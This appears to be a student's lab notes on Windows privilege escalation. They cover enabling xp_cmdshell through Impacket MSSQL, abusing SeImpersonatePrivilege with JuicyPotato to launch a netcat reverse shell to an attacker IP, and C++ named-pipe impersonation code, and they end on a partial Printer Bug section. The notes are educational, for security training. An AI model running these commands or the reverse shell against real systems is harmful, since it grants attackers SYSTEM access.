
#Windows_Privesc 

---

**Enabling xp_cmdshell**
- We can run OS commands via **Impacket MSSSQL** by typing `enable_xp_cmdshell` to get the following output:
```shell-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

=> We can run OS commands from a MySQL DB as follows:
```shell-session
SQL> xp_cmdshell whoami

output                                                                             

--------------------------------------------------------------------------------   

nt service\mssql$sqlexpress01
```

- We can also get the current user privileges as follows:
```shell-session
SQL> xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   
                                                                    
PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled 
```
**Note**: Since `SEImpersonatePrivilege` is enabled => we can impersonate another user, i.e. `NT AUTHORITY\SYSTEM`


### Escalating Privileges using JuicyPotato

- To get a reverse shell with **JuicyPotato** we use the following command:
```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
                                                                            
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08
```

**Note**:
- `-p` - specifies the program that will be run with escalated privileges, i.e. `cmd.exe`
- `-a` - specifies the command that will be run in `cmd.exe`, i.e `c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe`
- `c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe` - means that once connection to `10.10.14.3` is established, `cmd.exe` is launched and its output will be redirected to the network socket
- `-t *`  - This specifies the CLSID (Class Identifier) of the COM server. The asterisk (`*`) indicates that JuicyPotato should try multiple possible CLSIDs to find one that works for the privilege escalation.



### Privilege Impersonation

- Two main methods that can be used:
	- `CreateProcessWithToken` + `SeImpersonatePrivilage`
	- `CreateProcessAsUser` + `SeAssingPrimaryTokenPrivilege`

![[Pasted image 20240825173508.png]]

- From the above function we derive two other functions which work the same as the above but require a token:
![[Pasted image 20240825173753.png]]

- Since we have no way of generating a token with the correct permissions ourselves, the best way for the above attack is to impersonate a named pipe as described above.\

**Impersonating a User with a Named Pipe**
- **Main Idea**: The attacker tricks `NT AUTHORITY\SYSTEM` to connect to an RPC server they control by leveraging some of the pecularities of the `ISTORAGE COM` interface

- **Pipe Definition**: _a pipe is a section of shared memory that processes use for communication. The process that creates a pipe is the pipe server. A process that connects to a pipe is a pipe client. One process writes information to the pipe, then the other process reads the information from the pipe._” In other words, **pipes are one of the many ways of achieving Inter-Process Communications** (IPC) on Windows, just like RPC, COM or sockets for example.
- The code below can be used to impersonate a named pipe

```C++
HANDLE hPipe = INVALID_HANDLE_VALUE;
LPWSTR pwszPipeName = argv[1];
SECURITY_DESCRIPTOR sd = { 0 };
SECURITY_ATTRIBUTES sa = { 0 };
HANDLE hToken = INVALID_HANDLE_VALUE;

if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
{
    wprintf(L"InitializeSecurityDescriptor() failed. Error: %d - ", GetLastError());
    PrintLastErrorAsText(GetLastError());
    return -1;
}

if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
{
    wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
    PrintLastErrorAsText(GetLastError());
    return -1;
}

if ((hPipe = CreateNamedPipe(pwszPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
{
    wprintf(L"[*] Named pipe '%ls' listening...\n", pwszPipeName);
    ConnectNamedPipe(hPipe, NULL);
    wprintf(L"[+] A client connected!\n");

    if (ImpersonateNamedPipeClient(hPipe)) {

        if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken)) {

            PrintTokenUserSidAndName(hToken);
            PrintTokenImpersonationLevel(hToken);
            PrintTokenType(hToken);

            DoSomethingAsImpersonatedUser();

            CloseHandle(hToken);
        }
        else
        {
            wprintf(L"OpenThreadToken() failed. Error = %d - ", GetLastError());
            PrintLastErrorAsText(GetLastError());
        }
    }
    else
    {
        wprintf(L"ImpersonateNamedPipeClient() failed. Error = %d - ", GetLastError());
        PrintLastErrorAsText(GetLastError());
    }
    
    CloseHandle(hPipe);
}
else
{
    wprintf(L"CreateNamedPipe() failed. Error: %d - ", GetLastError());
    PrintLastErrorAsText(GetLastError());
}
```

**Code Explanation**:
```C++
if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
{
    wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d - ", GetLastError());
    PrintLastErrorAsText(GetLastError());
    return -1;
}
```
- This code converts the string security descriptor `D:(A;OICI;GA;;;WD)` to a security descriptor. This security descriptor means:
	- `D` - means that the script defines a `DACL`
	- `A` - Means that this is an **Access Control Entry(ACE)**
	- `GA` - `GENERIC_ALL`(Allow full control)
	- `WD` - to everybody in the `Everyone` group(`WD` = `Everyone` grooup)
	- `OICI` - `Object Inherit Container Inherit` means that this will apply to not only this process but its children also

- With the above code we can impersonate a named pipe using the following command:
**Attacker Shell**
```cmd-shell
NamedPipeImpersonation.exe \\.\pipe\foo123
```

**Client Shell**
```cmd-shell
echo test > \\localhost\pipe\foo123
```



### Getting a System Token

---


**Printer Bug**
- Based on a single RPC call to a function exposed by the **Print Spooler** service
```C++
DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( 
    /* [in] */ PRINTER_HANDLE hPrinter,
    /* [in] */ DWORD fdwFlags,
    /* [in] */ DWORD fdwOptions,
    /* [unique][string][in] */ wchar_t *pszLocalMachine,
    /* [in] */ DWORD dwPrinterLocal,
    /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions)
```

- This service monitors changes to the printer objects and sends change notifications to the printer clients via **RPC** calls using either `RpcRouterReplyPrinter` or `RpcRouterReplyPrinterEx`
- 